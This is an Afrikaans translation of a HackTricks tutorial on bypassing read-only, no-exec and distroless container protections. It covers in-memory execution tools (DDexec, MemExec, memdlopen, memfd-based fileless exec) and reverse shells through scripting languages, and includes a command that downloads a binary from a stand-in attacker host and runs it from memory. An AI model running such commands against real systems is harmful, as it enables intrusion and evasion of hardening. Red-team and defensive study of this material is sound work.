# Bypass FS beskerming: lees-slegs / geen-uitvoering / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video's

In die volgende video's kan jy die tegnieke wat op hierdie bladsy genoem word, meer in diepte verduidelik vind:

- [**DEF CON 31 - Verkenning van Linux Geheue Manipulasie vir Stealth en Ontvlugting**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth indringings met DDexec-ng & in-geheue dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## lees-slegs / geen-uitvoering scenario

Dit is al hoe meer algemeen om linux masjiene te vind wat gemonteer is met **lees-slegs (ro) lêerstelsel beskerming**, veral in houers. Dit is omdat dit so maklik is om 'n houer met 'n ro lêerstelsel te laat loop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Maar, selfs al is die lêerstelsel as ro gemonteer, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons nie iets op die skyf kan skryf nie. Hierdie gids sal egter **gemonteer wees met geen-uitvoering beskerming**, so as jy 'n binêre hier aflaai, **sal jy dit nie kan uitvoer nie**.

> [!WARNING]
> Vanuit 'n rooi span perspektief, maak dit **moeilik om binêre af te laai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of enumerators soos `kubectl`).

## Eenvoudigste omseiling: Skripte

Let daarop dat ek binêre genoem het, jy kan **enige skrip uitvoer** solank die interpreter binne die masjien is, soos 'n **shell skrip** as `sh` teenwoordig is of 'n **python** **skrip** as `python` geïnstalleer is.

Maar, dit is nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê om te loop, uit te voer nie.

## Geheue Omseilings

As jy 'n binêre wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur **dit uit geheue uit te voer**, aangesien die **beskermings daar nie van toepassing is nie**.

### FD + exec syscall omseiling

As jy 'n paar kragtige skrip enjin in die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre aflaai om uit geheue uit te voer, dit in 'n geheue lêer beskrywer (`create_memfd` syscall) stoor, wat nie deur daardie beskermings beskerm gaan word nie en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.

Vir hierdie kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre gee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre gecomprimeer en b64 geënkodeer** met die instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep is deur `create_memfd` syscall aan te roep en 'n oproep na die **exec** syscall om dit te laat loop.

> [!WARNING]
> Dit werk nie in ander skrip tale soos PHP of Node nie omdat hulle nie enige d**efault manier het om rou syscalls** vanuit 'n skrip aan te roep nie, so dit is nie moontlik om `create_memfd` aan te roep om die **geheue fd** te skep om die binêre te stoor nie.
>
> Boonop sal die skep van 'n **regte fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit te laat loop nie omdat die **geen-uitvoering beskerming** van toepassing sal wees.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om die **geheue van jou eie proses** te modifiseer deur sy **`/proc/self/mem`** te oorskryf.

Daarom, deur **die assembly kode** wat deur die proses uitgevoer word, te beheer, kan jy 'n **shellcode** skryf en die proses "mutate" om **enige arbitrêre kode** uit te voer.

> [!TIP]
> **DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **enige binêre** uit **geheue** te laai en **uit te voer**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, kyk na die Github of:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode demonised**, so elke keer wanneer jy 'n **ander binêre** wil **hardloop**, hoef jy nie DDexec weer te herlaai nie, jy kan net memexec shellcode via die DDexec tegniek hardloop en dan **kommunikeer met hierdie demon om nuwe binêre te stuur om te laai en te hardloop**.

Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre vanaf 'n PHP reverse shell** uit te voer in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **gemakliker manier om binêre** in geheue te laai om later uit te voer. Dit kan selfs toelaat om binêre met afhanklikhede te laai.

## Distroless Bypass

### Wat is distroless

Distroless houers bevat slegs die **minimale komponente wat nodig is om 'n spesifieke toepassing of diens te laat werk**, soos biblioteke en runtime afhanklikhede, maar sluit groter komponente soos 'n pakketbestuurder, skulp of stelseldienste uit.

Die doel van distroless houers is om die **aanvaloppervlak van houers te verminder deur onnodige komponente te verwyder** en die aantal kwesbaarhede wat uitgebuit kan word, te minimaliseer.

### Reverse Shell

In 'n distroless houer mag jy **nie eers `sh` of `bash`** vind om 'n gewone skulp te kry nie. Jy sal ook nie binêre soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.

> [!WARNING]
> Daarom, jy **sal nie** in staat wees om 'n **reverse shell** of **te enumerate** die stelsel soos jy gewoonlik doen nie.

As die gecompromitteerde houer egter byvoorbeeld 'n flask web hardloop, dan is python geïnstalleer, en daarom kan jy 'n **Python reverse shell** kry. As dit node hardloop, kan jy 'n Node rev shell kry, en dieselfde met byna enige **scripting taal**.

> [!TIP]
> Deur die scripting taal te gebruik, kan jy **die stelsel enumerate** met behulp van die taal se vermoëns.

As daar **geen `read-only/no-exec`** beskermings is nie, kan jy jou reverse shell misbruik om **in die lêerstelsel jou binêre te skryf** en hulle te **uitvoer**.

> [!TIP]
> egter, in hierdie soort houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue-uitvoertegnieke gebruik om hulle te omseil**.

Jy kan **voorbeelde** vind van hoe om **sommige RCE kwesbaarhede te exploiteer** om scripting tale **reverse shells** te kry en binêre vanaf geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

{{#include ../../../banners/hacktricks-training.md}}
